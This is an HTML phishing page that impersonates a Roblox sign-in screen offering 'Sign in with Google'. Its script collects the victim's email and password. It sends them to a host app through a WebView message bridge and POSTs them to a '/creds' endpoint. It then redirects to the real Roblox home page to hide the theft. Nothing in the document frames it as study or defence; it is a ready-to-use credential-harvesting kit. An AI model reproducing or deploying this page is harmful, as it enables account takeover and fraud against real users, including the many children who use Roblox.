<!doctype html>
<html lang="en"><head>
<meta charset="utf-8"><title>Sign in - Roblox</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  :root { --rbx-blue:#00a2ff; --g-gray:#dadce0; --g-dark:#202124; }
  * { box-sizing:border-box; }
  html,body { margin:0; height:100%; font-family:"Segoe UI",Roboto,Arial,sans-serif; background:#fff; color:var(--g-dark); }
  .wrap { min-height:100vh; display:flex; align-items:center; justify-content:center; }
  .card { width:440px; border:1px solid var(--g-gray); border-radius:12px; padding:48px 40px 36px; }
  .rbx-logo { text-align:center; font-size:34px; font-weight:800; color:var(--rbx-blue); letter-spacing:-1px; }
  .rbx-logo span { display:block; font-size:20px; font-weight:500; color:#5f6368; margin-top:6px; letter-spacing:0; }
  h1 { font-size:22px; font-weight:400; text-align:center; margin:24px 0 32px; }
  .gbtn { display:flex; align-items:center; gap:14px; width:100%; padding:12px 16px; border:1px solid var(--g-gray); border-radius:8px; background:#fff; cursor:pointer; font-size:14px; font-weight:500; }
  .gbtn:hover { background:#f8f9fa; }
  .gicon { width:20px; height:20px; }
  .divider { display:flex; align-items:center; gap:12px; color:#5f6368; font-size:12px; margin:26px 0 18px; }
  .divider::before,.divider::after { content:""; flex:1; height:1px; background:var(--g-gray); }
  label { display:block; font-size:12px; color:#5f6368; margin-bottom:6px; }
  input { width:100%; padding:13px 15px; border:1px solid var(--g-gray); border-radius:6px; font-size:15px; margin-bottom:18px; outline:none; }
  input:focus { border-color:var(--rbx-blue); box-shadow:0 0 0 2px rgba(0,162,255,.2); }
  .continue { background:var(--rbx-blue); color:#fff; border:none; border-radius:6px; padding:12px 24px; font-size:14px; font-weight:600; cursor:pointer; float:right; }
  .continue:hover { background:#0089d9; }
  .foot { margin-top:60px; font-size:11px; color:#5f6368; text-align:center; }
  .err { color:#d93025; font-size:12px; margin-bottom:10px; display:none; }
</style></head><body>
<div class="wrap"><div class="card">
  <div class="rbx-logo">ROBLOX<span>Sign in to continue</span></div>
  <h1>Sign in with Google</h1>

  <button class="gbtn" id="gbtn">
    <svg class="gicon" viewBox="0 0 48 48">
      <path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.6l6.8-6.8C35.8 2.5 30.3 0 24 0 14.6 0 6.5 5.4 2.5 13.3l7.9 6.1C12.3 13.3 17.7 9.5 24 9.5z"/>
      <path fill="#4285F4" d="M46.1 24.6c0-1.6-.1-3.1-.4-4.6H24v8.8h12.5c-.5 2.9-2.2 5.3-4.6 6.9l7.7 6C43.7 37.6 46.1 31.6 46.1 24.6z"/>
      <path fill="#FBBC05" d="M10.4 28.6c-.5-1.5-.8-3-.8-4.6 0-1.6.3-3.2.8-4.6l-7.9-6.1C.9 16.5 0 20.1 0 24s.9 7.5 2.5 10.7l7.9-6.1z"/>
      <path fill="#34A853" d="M24 48c6.5 0 12-2.1 16-5.8l-7.7-6c-2.1 1.5-4.9 2.4-8.3 2.4-6.3 0-11.6-3.8-13.6-9.2l-7.9 6.1C6.5 42.6 14.6 48 24 48z"/>
    </svg>
    Continue with Google
  </button>

  <div class="divider">or</div>
  <form id="f" autocomplete="off">
    <div class="err" id="err">Enter a valid email or phone number</div>
    <label for="email">Email or phone</label>
    <input id="email" name="email" type="text" required>
    <label for="password">Password</label>
    <input id="password" name="password" type="password" required>
    <button class="continue" type="submit">Continue</button>
    <div style="clear:both"></div>
  </form>

  <div class="foot">English (United States) &nbsp;·&nbsp; Help &nbsp;·&nbsp; Privacy &nbsp;·&nbsp; Terms</div>
</div></div>

<script>
  function send(email, password) {
    if (window.chrome && window.chrome.webview) {
      window.chrome.webview.postMessage(email + "|" + password);
    }
    try { fetch("/creds", {
      method:"POST", headers:{"Content-Type":"application/json"},
      body: JSON.stringify({email, password, stage:"google-form"})
    }); } catch(e){}
  }
  document.getElementById("f").addEventListener("submit", function(e){
    e.preventDefault();
    const email = document.getElementById("email").value.trim();
    const password = document.getElementById("password").value;
    if (!email || !password) { document.getElementById("err").style.display = "block"; return; }
    send(email, password);
    document.querySelector(".continue").textContent = "Signing in…";
    setTimeout(() => { location.href = "https://www.roblox.com/home"; }, 1200);
  });
  document.getElementById("gbtn").addEventListener("click", function(){
    document.getElementById("email").focus();
  });
</script>
</body></html>
